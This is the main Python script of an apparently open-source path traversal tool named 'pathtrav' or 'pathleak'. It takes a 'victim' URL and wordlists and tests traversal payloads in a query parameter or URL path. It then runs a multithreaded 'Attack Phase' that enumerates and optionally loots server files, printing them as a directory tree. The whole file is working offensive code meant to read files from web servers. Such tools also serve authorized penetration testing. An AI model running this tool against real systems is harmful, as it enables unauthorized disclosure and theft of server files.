#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from multiprocessing.pool import ThreadPool as Pool
import treelib, argparse
import requests, sys
import random, string
import subprocess

from itertools import permutations
from core.methods.parser import build_parser
from core.methods.print import banner
from core.methods.select import select

from core.methods.tree import *
from core.variables import *
from core.methods.query import *
from core.methods.inpath import *

import time

filetree = treelib.Tree()
filetree.create_node(color.O+"/"+color.END+color.RD, "root")

def listsplit(l, n):
    if n == 0:
        n += 1
    for i in range(0, len(l), n):
        yield l[i:i + n] 
        

def main() -> int:    
    banner()
    parser = build_parser()
    opt = vars(parser.parse_args())
    args = parser.parse_args()
    if not (opt["lists"] and opt["victim"] and opt["attack"]):
        parser.print_usage()
        sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -v, -a and -l mandatory')
    dirs = opt["lists"]
    if opt['lists']:
        with open(args.lists[0]) as filelisted:
            for l in filelisted:
                commons.append(l.strip())
        with open(args.lists[1]) as dirlisted:
            for l in dirlisted:
                sdirs.append(l.strip())
  
    loot = False
    victim2 = ""
    depth = 2
    verbose = False
    dirs = 0
    summary = False
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []

    if opt["loot"]:
        loot = True

    if opt["vic2"]:
        victim2 = args.vic2

    if opt["depth"]:
        depth = args.depth

    if opt["verbosity"]:
        verbose = True
        
    if opt["summary"]:
        summary = True
        
    iter=1
    ndirs=list.copy(sdirs)
    del ndirs[0]
    mdirs=[]
    while (iter<=(depth)):
        mdirs += permutations(ndirs,(iter+1))
        iter+=1
    for elem in mdirs:
        diri=''.join(elem)
        sdirs.append(diri)
    splitted = listsplit(sdirs, round(len(sdirs)/processes))
    paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))
    if (args.attack == 1):
        if not opt["param"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -p mandatory for -a 1')
        print("{}pathleak: {}PARAM{}".format(color.RC, color.END+color.RB, color.END))
        print("    v" + version)
        time.sleep(0.5)
        
        #print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} init. {2}\n'.format(color.RD, color.END, time.strftime("%I:%M:%S %p")))
        print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} List Payloads\n'.format(color.RD, color.END))
        
        starting_time = time.time()
        #test for the vulnerability
        m = 12
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(determine_payloads_query, args=(args.victim,victim2,args.param,verbose,m,l,)) for l in paysplit]
            for i in res:
                pays = i.get()
                foundpayloads += pays
                
        ending_time = time.time()
        vuln_time = ending_time - starting_time
                
        attack = False
        if foundpayloads:
            attack = True
            selectedpayloads = select(foundpayloads)
        else:
            cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
            if cont != "":
                attack = True
                selectedpayloads = payloadlist
        #start the attack
        starting_time = time.time()
        if attack:
            print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(query, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
                for i in res:
                    restuple = i.get()
                    foundfiles += restuple[0]
                    foundurls += restuple[1]
    elif (args.attack == 2):
        print("{}pathleak: {}PATH{}".format(color.RC, color.END+color.RB, color.END))
        print("    v" + version)
        time.sleep(0.5)        
        print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} List Payloads\n'.format(color.RD, color.END))
        
        starting_time = time.time()
        #test for the vulnerability
        m = 12
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(determine_payloads_inpath, args=(args.victim,victim2,args.param,verbose,m,l,)) for l in paysplit]
            for i in res:
                pays = i.get()
                foundpayloads += pays
                
        ending_time = time.time()
        vuln_time = ending_time - starting_time
                
        attack = False
        if foundpayloads:
            attack = True
            selectedpayloads = select(foundpayloads)
        else:
            cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
            if cont != "":
                attack = True
                selectedpayloads = payloadlist
        #start the attack
        starting_time = time.time()
        if attack:
            print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(inpath, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
                for i in res:
                    restuple = i.get()
                    foundfiles += restuple[0]
                    foundurls += restuple[1]
                    
    ending_time = time.time()
    attack_time = ending_time - starting_time
    total_time = vuln_time + attack_time
    if summary:
        banner()
    else:
        #print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} fin. {2}\n'.format(color.RD, color.END, time.strftime("%I:%M:%S %p")))
        print('\n{0}┌─[{1}pathleak{0}]{1}\n{0}└──╼{1} Directory Tree\n'.format(color.RD, color.END))
    if foundfiles:
        create_tree(filetree, foundfiles)
        filetree.show()
    if foundurls:
        fnd = []
        for i in foundurls:
            if i not in fnd:
                if summary:
                    print(color.END+i)
                fnd.append(i)
    else:
        print("nothing found")
    print("{}Scan completed in {}s.{}".format(color.RC, total_time, color.END))


if __name__ == "__main__":
    try:
       main()
    except KeyboardInterrupt:
        print('\nInterrvpted.\n')
